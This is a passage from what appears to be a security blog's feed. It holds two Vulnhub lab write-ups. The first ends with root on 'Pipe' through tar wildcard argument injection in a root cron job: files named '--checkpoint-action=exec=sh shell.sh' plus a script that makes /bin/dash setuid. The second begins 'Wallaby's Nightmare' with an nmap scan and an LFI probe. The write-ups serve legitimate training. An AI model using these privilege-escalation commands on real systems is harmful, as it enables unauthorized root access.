&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 24
drwxr-xr-x 3 rene rene 4096 Jul  6  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root root 4096 Jul  5  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene  220 Jul  5  2015 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 3515 Jul  5  2015 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene  675 Jul  5  2015 .profile
drwxrwxrwx 2 rene rene 4096 Jul 30 06:21 backup
www-data@pipe:/home/rene&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd  &lt;/span&gt;backup
&lt;span class=&quot;nb&quot;&gt;cd  &lt;/span&gt;backup
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 72
drwxrwxrwx 2 rene rene  4096 Jul 30 06:21 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 rene rene  4096 Jul  6  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 50123 Jul 30 06:20 backup.tar.gz
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 10605 Jul 30 06:21 sys-2875.BAK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It's an automated backup! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 84
drwxrwxrwx 2 rene rene  4096 Jul 30 06:22 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 rene rene  4096 Jul  6  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 50123 Jul 30 06:20 backup.tar.gz
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 11529 Jul 30 06:22 sys-1884.BAK
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 10605 Jul 30 06:21 sys-2875.BAK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's look at the crontab. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
&lt;span class=&quot;c&quot;&gt;# /etc/crontab: system-wide crontab&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Unlike any other crontab you don't have to run the `crontab'&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# command to install the new version when you edit this file&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# and files in /etc/cron.d. These files also have username fields,&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# that none of the other crontabs do.&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

&lt;span class=&quot;c&quot;&gt;# m h dom mon dow user	command&lt;/span&gt;
17 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	root    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.hourly
25 6	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	root	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.daily &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
47 6	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 7	root	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.weekly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
52 6	1 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	root	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.monthly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; root /root/create_backup.sh
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/5 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; root /usr/bin/compress.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It is also possible to read &lt;b&gt;compress.sh&lt;/b&gt; script. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/bin/compress.sh        
 &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/bin/compress.sh
&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;

rm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /home/rene/backup/backup.tar.gz
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/rene/backup
&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;cfz /home/rene/backup/backup.tar.gz &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
chown rene:rene /home/rene/backup/backup.tar.gz
rm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /home/rene/backup/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.BAK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A wildcard. After reading about &lt;a href=&quot;http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&quot;&gt;&lt;b&gt;Unix wildcard exploit&lt;/b&gt;&lt;/a&gt;, it may be possible to gain root access. But firstly, what kind of shells are installed on the server? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /bin/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;sh
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /bin/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;sh
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root 1029624 Jul 13  2014 /bin/bash
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root  125400 Jul  8  2014 /bin/dash
lrwxrwxrwx 1 root root       4 Jul 13  2014 /bin/rbash -&amp;gt; bash
lrwxrwxrwx 1 root root       4 Jul  8  2014 /bin/sh -&amp;gt; dash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, there is &lt;b&gt;/bin/dash&lt;/b&gt; installed on the server. Now it's time to create a script that will allow us to root the box. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sh&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;shell.sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&amp;lt;ckup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sh&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;shell.sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                         
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'chmod u+s /bin/dash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.sh
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'chmod u+s /bin/dash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.sh
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'touch /home/rene/backup/done'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; shell.sh
&amp;lt;ckup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'touch /home/rene/backup/done'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; shell.sh                       
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;shell.sh
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;shell.sh
chmod u+s /bin/dash
touch /home/rene/backup/done
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod +x shell.sh
chmod +x shell.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And now we only have to wait for a file called &lt;b&gt;done&lt;/b&gt;. After few minutes it appeared. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 124
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data      1 Jul 30 07:05 &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sh shell.sh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data      1 Jul 30 07:05 &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
drwxrwxrwx 2 rene     rene       4096 Jul 30 07:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 rene     rene       4096 Jul  6  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene     rene     104106 Jul 30 07:10 backup.tar.gz
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root     root          0 Jul 30 07:10 &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 www-data www-data     49 Jul 30 07:05 shell.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;By launching &lt;b&gt;dash&lt;/b&gt; shell, we are privilaged with root access.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/dash
/bin/dash
&lt;span class=&quot;c&quot;&gt;# id&lt;/span&gt;
id
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
whoami
root&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's look for final flag. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# ls -la /root&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /root
total 28
drwx------  2 root root 4096 Jul  9  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Jul  5  2015 ..
lrwxrwxrwx  1 root root    9 Jul  5  2015 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  570 Jan 31  2010 .bashrc
lrwxrwxrwx  1 root root    9 Jul  9  2015 .nano_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Nov 20  2007 .profile
&lt;span class=&quot;nt&quot;&gt;-rwx------&lt;/span&gt;  1 root root  120 Jul  6  2015 create_backup.sh
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root 4251 Jul  6  2015 flag.txt
&lt;span class=&quot;c&quot;&gt;# cat /root/flag.txt&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/flag.txt
                                                                   .aMMMMMMMMn.  ,aMMMMn.
                                                                 .aMccccccccc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMn.    &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;Mb
                                                                aMccccccccccccccc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Mn    MP
                                                               .AMMMMn.   MM &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMY&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;ccaM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
                                                              dM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMb  YP        &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;cMY
                                                              YM.  .dMMP   aMn.     .cMP
                                                               &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMn.     aMMMMMMMMMMMY&lt;span class=&quot;s1&quot;&gt;'
                                                                .'&lt;/span&gt;YMMb.           ccMP
                                                             .dMcccccc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Mc....cMb.cMP&lt;span class=&quot;s1&quot;&gt;'
                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.
                                                          dY*'&lt;/span&gt;  &lt;span class=&quot;s1&quot;&gt;'*M;ccccMM..dMMM..MP*cc*Mb
                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP
                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*
                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
                                                          Yb;cc;dMMMMMMMMMMMP*'&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMP&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
                                                           &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;YMMMPYMMMMMMP&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'          curchack
                                                       +####################################+
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       +----------------------------------+-+
                                                        ####################################
                                                             |======                  |
                                                             |======                  |
                                                             |=====                   |
                                                             |====                    |
                                                             |                        |
                                                             +                        +

 .d8888b.                 d8b          d8b               888                                                                    d8b
d88P  Y88b                Y8P          88P               888                                                                    Y8P
888    888                             8P                888
888        .d88b.  .d8888b888   88888b.&quot;  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
888       d8P  Y8bd88P&quot;   888   888 &quot;88b d8P  Y8b88K     888      888 &quot;88b    &quot;88b88K        888  888888 &quot;88bd8P  Y8b   888 &quot;88b888888 &quot;88bd8P  Y8b
888    88888888888888     888   888  888 88888888&quot;Y8888b.888      888  888.d888888&quot;Y8888b.   888  888888  88888888888   888  888888888  88888888888
Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
 &quot;Y8888P&quot;  &quot;Y8888  &quot;Y8888P888   888  888  &quot;Y8888  88888P'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Y888   88888P&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Y888888 88888P'    &quot;&lt;/span&gt;Y88888888  888 &lt;span class=&quot;s2&quot;&gt;&quot;Y8888    88888P&quot;&lt;/span&gt; 88888888P&lt;span class=&quot;s2&quot;&gt;&quot;  &quot;&lt;/span&gt;Y8888Y8P
                                                                  888                                                   888        888
                                                                  888                                                   888        888
                                                                  888                                                   888        888
Well Done!
Here&lt;span class=&quot;s1&quot;&gt;'s your flag: 0089cd4f9ae79402cdd4e7b8931892b7&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And here it is! &lt;/p&gt;
</description>
        <pubDate>Mon, 31 Jul 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-pipe/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-pipe/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Wallaby's: Nightmare</title>
        <description>&lt;p&gt;Today we're going to play with another machine called &lt;b&gt;Wallaby's: Nightmare&lt;/b&gt;. Here's the description: &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;This is my first CTF/Vulnerable VM ever. I created it both for educational purposes and so people can have a little fun testing their skills in a legal, pentest lab environment.

Some notes before you download!

    Try to use a Host-Only Adapter. This is an intentionally vulnerable machine and leaving it open on your network can have bad results.
    It should work with Vmware flawlessly. I've tested it with vbox and had one other friend test it on Vbox as well so I think it should work just fine on anything else.

This is a Boot2Root machine. The goal is for you to attempt to attempt to gain root privileges in the VM. Do not try to get the root flag through a recovery iso etc, this is essentially cheating! The idea is to get through by pretending this machine is being attacked over a network with no physical access.

I themed this machine to make it feel a bit more realistic. You are breaking into a fictional characters server (named Wallaby) and trying to gain root without him noticing, or else the difficulty level will increase if you make the wrong move! Good luck and I hope you guys enjoy!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1&gt;Challenge&lt;/h1&gt;

&lt;p&gt;As always, we're going to start from finding an IP address of the machine using nmap. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 192.168.56.102/24

Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 08:14 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.1
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000062s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.1 are closed
MAC Address: 0A:00:27:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.100
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00011s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:29:FD:0E &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00056s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
6667/tcp filtered irc
MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0000050s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
All 1000 scanned ports on 192.168.56.102 are closed

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;6.10 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can start the fun from looking at the http port, there's always something interesting in the website. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/first-look.png&quot; alt=&quot;First Look&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hmmm, prompt asking us for a username. Let's enter something and see what happens. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/website-inside.png&quot; alt=&quot;Website - the inside&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see it's a simple introducion to the ctf. As a standart part of checking everything, I have found XSS in the form, but it won't help us for now. We can start digging further by clicking on &lt;b&gt;start the ctf&lt;/b&gt; link, which moves us to a new page. And what is good for us, is that it uses the GET parameter to display the file.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101/?page=home&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Maybe it's vulnerable to Local File Intrusion? Let's check this by trying to get the content of &lt;b&gt;/etc/passwd&lt;/b&gt; file. &lt;/p&gt;

